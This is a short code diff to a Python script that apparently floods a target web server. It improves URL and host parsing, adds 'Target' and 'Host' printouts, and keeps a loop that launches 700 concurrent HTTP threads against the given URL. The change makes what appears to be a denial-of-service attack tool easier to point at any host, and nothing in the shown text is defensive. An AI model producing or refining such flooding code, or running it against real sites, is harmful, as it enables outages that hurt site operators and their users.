@@ -146,10 +146,25 @@ if __name__ == "__main__":
 				if sys.argv[2] == "safe":
 					set_safe()
 			url = sys.argv[1]
+			
+			# Add http:// if not present
+			if not url.startswith(('http://', 'https://')):
+				url = 'http://' + url
+				
+			# Ensure URL has proper format
 			if url.count("/") == 2:
 				url = url + "/"
-			m = re.search('http://([^/]*)/?.*', url)
+				
+			# Improved URL pattern matching
+			m = re.search('(?:https?://)?([^/]+)', url)
+			if not m:
+				print("Error: Invalid URL format. Please use a valid URL (e.g., example.com or http://example.com)")
+				sys.exit(1)
+				
 			host = m.group(1)
+			print(f"Target: {url}")
+			print(f"Host: {host}")
+			
 			for i in range(700):
 				t = HTTPThread()
 				t.start()
